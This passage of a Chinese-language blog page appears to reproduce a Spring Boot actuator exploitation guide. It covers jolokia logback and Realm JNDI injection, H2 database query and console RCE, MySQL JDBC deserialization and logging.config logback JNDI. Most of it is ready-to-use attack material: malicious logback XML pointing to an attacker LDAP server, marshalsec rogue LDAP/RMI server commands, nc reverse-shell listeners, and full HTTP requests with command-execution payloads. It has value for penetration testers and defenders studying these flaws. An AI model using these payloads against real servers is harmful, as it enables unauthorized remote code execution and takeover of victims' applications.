id="步骤三：请求远端xml文件"><a href="#步骤三：请求远端xml文件" class="headerlink" title="步骤三：请求远端xml文件"></a>步骤三：请求远端xml文件</h5><p>首先启动一个http服务</p><pre class="language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>m SimpleHTTPServer <span class="token number">80</span></code></pre><p>然后在本地请求如下地址</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/x.x.x.x!/logback.xml</code></pre><p>成功读取&#x2F;etc&#x2F;passwd<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210604153950.png" alt="20210604153950"></p><h3 id="0x05：jolokia-logback-JNDI-RCE"><a href="#0x05：jolokia-logback-JNDI-RCE" class="headerlink" title="0x05：jolokia logback JNDI RCE"></a>0x05：jolokia logback JNDI RCE</h3><h4 id="利用条件：-8"><a href="#利用条件：-8" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li><p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p></li><li><p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</p></li><li><p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p></li><li><p>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</p></li></ul><h4 id="利用方法：-8"><a href="#利用方法：-8" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans-1"><a href="#步骤一：查看已存在的-MBeans-1" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p><h5 id="步骤二：托管-xml-文件"><a href="#步骤二：托管-xml-文件" class="headerlink" title="步骤二：托管 xml 文件"></a>步骤二：托管 xml 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用 python 快速开启 http server</span>python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span></code></pre><p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code>  文件，内容如下：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insertFromJNDI</span> <span class="token attr-name">env-entry-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ldap://your-vps-ip:1389/JNDIObject<span class="token punctuation">"</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>appName<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span></code></pre><h5 id="步骤三：准备要执行的-Java-代码"><a href="#步骤三：准备要执行的-Java-代码" class="headerlink" title="步骤三：准备要执行的 Java 代码"></a>步骤三：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>，</p><p>使用兼容低版本 jdk 的方式编译：</p><pre class="language-bash" data-language="bash"><code class="language-bash">javac <span class="token parameter variable">-source</span> <span class="token number">1.5</span> <span class="token parameter variable">-target</span> <span class="token number">1.5</span> JNDIObject.java</code></pre><p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p><h5 id="步骤四：架设恶意-ldap-服务"><a href="#步骤四：架设恶意-ldap-服务" class="headerlink" title="步骤四：架设恶意 ldap 服务"></a>步骤四：架设恶意 ldap 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/<span class="token comment">#JNDIObject 1389</span></code></pre><h5 id="步骤五：监听反弹-shell-的端口"><a href="#步骤五：监听反弹-shell-的端口" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lv</span> <span class="token number">443</span></code></pre><h5 id="步骤六：从外部-URL-地址加载日志配置文件"><a href="#步骤六：从外部-URL-地址加载日志配置文件" class="headerlink" title="步骤六：从外部 URL 地址加载日志配置文件"></a>步骤六：从外部 URL 地址加载日志配置文件</h5><blockquote><p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p></blockquote><p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p><pre class="language-markup" data-language="markup"><code class="language-markup">/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml</code></pre><h4 id="漏洞原理：-3"><a href="#漏洞原理：-3" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</li><li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​<a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p><h4 id="漏洞环境：-3"><a href="#漏洞环境：-3" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository&#x2F;springboot-jolokia-logback-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9094/env</code></pre><h3 id="0x06：jolokia-Realm-JNDI-RCE"><a href="#0x06：jolokia-Realm-JNDI-RCE" class="headerlink" title="0x06：jolokia Realm JNDI RCE"></a>0x06：jolokia Realm JNDI RCE</h3><h4 id="利用条件：-9"><a href="#利用条件：-9" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141&#x2F;7u131&#x2F;8u121(RMI)，但相关环境可绕过</li></ul><h4 id="利用方法：-9"><a href="#利用方法：-9" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans-2"><a href="#步骤一：查看已存在的-MBeans-2" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p><h5 id="步骤二：准备要执行的-Java-代码"><a href="#步骤二：准备要执行的-Java-代码" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>。</p><h5 id="步骤三：托管-class-文件"><a href="#步骤三：托管-class-文件" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用 python 快速开启 http server</span>python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span></code></pre><p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><h5 id="步骤四：架设恶意-rmi-服务"><a href="#步骤四：架设恶意-rmi-服务" class="headerlink" title="步骤四：架设恶意 rmi 服务"></a>步骤四：架设恶意 rmi 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/<span class="token comment">#JNDIObject 1389</span></code></pre><h5 id="步骤五：监听反弹-shell-的端口-1"><a href="#步骤五：监听反弹-shell-的端口-1" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">443</span></code></pre><h5 id="步骤六：发送恶意-payload"><a href="#步骤六：发送恶意-payload" class="headerlink" title="步骤六：发送恶意 payload"></a>步骤六：发送恶意 payload</h5><p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p><h4 id="漏洞原理：-4"><a href="#漏洞原理：-4" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li><li>设置 connectionURL 地址为 RMI Service URL</li><li>设置 contextFactory 为 RegistryContextFactory</li><li>停止 Realm</li><li>启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​<a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p><h4 id="漏洞环境：-4"><a href="#漏洞环境：-4" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository&#x2F;springboot-jolokia-logback-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9094/env</code></pre><h3 id="0x07：restart-h2-database-query-RCE"><a href="#0x07：restart-h2-database-query-RCE" class="headerlink" title="0x07：restart h2 database query RCE"></a>0x07：restart h2 database query RCE</h3><h4 id="利用条件：-10"><a href="#利用条件：-10" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li></ul><h4 id="利用方法：-10"><a href="#利用方法：-10" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：设置-spring-datasource-hikari-connection-test-query-属性"><a href="#步骤一：设置-spring-datasource-hikari-connection-test-query-属性" class="headerlink" title="步骤一：设置 spring.datasource.hikari.connection-test-query 属性"></a>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h5><blockquote><p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p></blockquote><p>spring 1.x（无回显执行命令）</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedspring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception&#123;Runti','me.getRun','time().exe','c(new String[]&#123;m1,m2,m3&#125;);&#125;');CALL T5('cmd','/c','calc');</code></pre><p>spring 2.x（无回显执行命令）</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception&#123;Runti','me.getRun','time().exe','c(new String[]&#123;m1,m2,m3&#125;);&#125;');CALL T5('cmd','/c','calc');"&#125;</code></pre><h5 id="步骤二：重启应用"><a href="#步骤二：重启应用" class="headerlink" title="步骤二：重启应用"></a>步骤二：重启应用</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /restartContent-Type: application/x-www-form-urlencoded</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/restartContent-Type: application/json</code></pre><h4 id="漏洞原理：-5"><a href="#漏洞原理：-5" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li><li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li><li>restart 重启应用，会建立新的数据库连接</li><li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-5"><a href="#漏洞分析：-5" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​<a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p><h4 id="漏洞环境：-5"><a href="#漏洞环境：-5" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository&#x2F;springboot-h2-database-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9096/actuator/env</code></pre><h3 id="0x08：h2-database-console-JNDI-RCE"><a href="#0x08：h2-database-console-JNDI-RCE" class="headerlink" title="0x08：h2 database console JNDI RCE"></a>0x08：h2 database console JNDI RCE</h3><h4 id="利用条件：-11"><a href="#利用条件：-11" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li><li>spring 配置中启用 h2 console  <code>spring.h2.console.enabled=true</code></li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1（LDAP 方式）</li></ul><h4 id="利用方法：-11"><a href="#利用方法：-11" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：访问路由获得-jsessionid"><a href="#步骤一：访问路由获得-jsessionid" class="headerlink" title="步骤一：访问路由获得 jsessionid"></a>步骤一：访问路由获得 jsessionid</h5><p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p><h5 id="步骤二：准备要执行的-Java-代码-1"><a href="#步骤二：准备要执行的-Java-代码-1" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>，</p><p>使用兼容低版本 jdk 的方式编译：</p><pre class="language-bash" data-language="bash"><code class="language-bash">javac <span class="token parameter variable">-source</span> <span class="token number">1.5</span> <span class="token parameter variable">-target</span> <span class="token number">1.5</span> JNDIObject.java</code></pre><p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p><h5 id="步骤三：托管-class-文件-1"><a href="#步骤三：托管-class-文件-1" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用 python 快速开启 http server</span>python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span></code></pre><p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><h5 id="步骤四：架设恶意-ldap-服务-1"><a href="#步骤四：架设恶意-ldap-服务-1" class="headerlink" title="步骤四：架设恶意 ldap 服务"></a>步骤四：架设恶意 ldap 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/<span class="token comment">#JNDIObject 1389</span></code></pre><h5 id="步骤五：监听反弹-shell-的端口-2"><a href="#步骤五：监听反弹-shell-的端口-2" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lv</span> <span class="token number">443</span></code></pre><h5 id="步骤六：发包触发-JNDI-注入"><a href="#步骤六：发包触发-JNDI-注入" class="headerlink" title="步骤六：发包触发 JNDI 注入"></a>步骤六：发包触发 JNDI 注入</h5><p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>ldap://your-vps-ip:1389/JNDIObject</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">POST /h2-console/login.do?jsessionid<span class="token operator">=</span>xxxxxxHost: www.example.comContent-Type: application/x-www-form-urlencodedReferer: http://www.example.com/h2-console/login.jsp?jsessionid<span class="token operator">=</span>xxxxxx<span class="token assign-left variable">language</span><span class="token operator">=</span>en<span class="token operator">&amp;</span><span class="token assign-left variable">setting</span><span class="token operator">=</span>Generic+H2+%28Embedded%29<span class="token operator">&amp;</span><span class="token assign-left variable">name</span><span class="token operator">=</span>Generic+H2+%28Embedded%29<span class="token operator">&amp;</span><span class="token assign-left variable">driver</span><span class="token operator">=</span>javax.naming.InitialContext<span class="token operator">&amp;</span><span class="token assign-left variable">url</span><span class="token operator">=</span>ldap://your-vps-ip:1389/JNDIObject<span class="token operator">&amp;</span><span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span></code></pre><h4 id="漏洞分析：-6"><a href="#漏洞分析：-6" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​<a href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p><h4 id="漏洞环境：-6"><a href="#漏洞环境：-6" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository&#x2F;springboot-h2-database-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9096/h2-console</code></pre><h3 id="0x09：mysql-jdbc-deserialization-RCE"><a href="#0x09：mysql-jdbc-deserialization-RCE" class="headerlink" title="0x09：mysql jdbc deserialization RCE"></a>0x09：mysql jdbc deserialization RCE</h3><h4 id="利用条件：-12"><a href="#利用条件：-12" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h4 id="利用方法：-12"><a href="#利用方法：-12" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看环境依赖"><a href="#步骤一：查看环境依赖" class="headerlink" title="步骤一：查看环境依赖"></a>步骤一：查看环境依赖</h5><p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code>  关键词，并记录下其版本号（5.x 或 8.x）；</p><p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p><p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code>  值，方便后续恢复其正常 jdbc url 值。</p><h5 id="步骤二：架设恶意-rogue-mysql-server"><a href="#步骤二：架设恶意-rogue-mysql-server" class="headerlink" title="步骤二：架设恶意 rogue mysql server"></a>步骤二：架设恶意 rogue mysql server</h5><p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial.jar CommonsCollections3 calc <span class="token operator">></span> payload.ser</code></pre><p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p><h5 id="步骤三：设置-spring-datasource-url-属性"><a href="#步骤三：设置-spring-datasource-url-属性" class="headerlink" title="步骤三：设置 spring.datasource.url 属性"></a>步骤三：设置 spring.datasource.url 属性</h5><blockquote><p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p></blockquote><p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p><pre class="language-sql" data-language="sql"><code class="language-sql">jdbc:mysql:<span class="token comment">//your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span></code></pre><p> mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p><pre class="language-sql" data-language="sql"><code class="language-sql">jdbc:mysql:<span class="token comment">//your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span></code></pre><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedspring.datasource.url=对应属性值</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"spring.datasource.url","value":"对应属性值"&#125;</code></pre><h5 id="步骤四：刷新配置-1"><a href="#步骤四：刷新配置-1" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /refreshContent-Type: application/x-www-form-urlencoded</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/refreshContent-Type: application/json</code></pre><h5 id="步骤五：触发数据库查询"><a href="#步骤五：触发数据库查询" class="headerlink" title="步骤五：触发数据库查询"></a>步骤五：触发数据库查询</h5><p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p><h5 id="步骤六：恢复正常-jdbc-url"><a href="#步骤六：恢复正常-jdbc-url" class="headerlink" title="步骤六：恢复正常 jdbc url"></a>步骤六：恢复正常 jdbc url</h5><p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p><h4 id="漏洞原理：-6"><a href="#漏洞原理：-6" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li><li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li><li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li><li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li><li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-7"><a href="#漏洞分析：-7" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​<a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p><h4 id="漏洞环境：-7"><a href="#漏洞环境：-7" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><blockquote><p>需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出</p></blockquote><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce">repository&#x2F;springboot-mysql-jdbc-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9097/actuator/env</code></pre><p>发送完 payload 后触发漏洞：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9097/product/list</code></pre><h3 id="0x0A：restart-logging-config-logback-JNDI-RCE"><a href="#0x0A：restart-logging-config-logback-JNDI-RCE" class="headerlink" title="0x0A：restart logging.config logback JNDI RCE"></a>0x0A：restart logging.config logback JNDI RCE</h3><h4 id="利用条件：-13"><a href="#利用条件：-13" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li><li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li></ul><h4 id="利用方法：-13"><a href="#利用方法：-13" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-xml-文件"><a href="#步骤一：托管-xml-文件" class="headerlink" title="步骤一：托管 xml 文件"></a>步骤一：托管 xml 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用 python 快速开启 http server</span>python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span></code></pre><p>在根目录放置以 <code>xml</code> 结尾的  <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insertFromJNDI</span> <span class="token attr-name">env-entry-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y<span class="token punctuation">"</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>appName<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span></code></pre><h5 id="步骤二：托管恶意-ldap-服务及代码"><a href="#步骤二：托管恶意-ldap-服务及代码" class="headerlink" title="步骤二：托管恶意 ldap 服务及代码"></a>步骤二：托管恶意 ldap 服务及代码</h5><p>参考<a href="https://landgrey.me/blog/21/">文章</a>，修改 <a href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a> 并启动（也可以使用其他方法）：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDIExploit-1.0-SNAPSHOT.jar <span class="token parameter variable">-i</span> 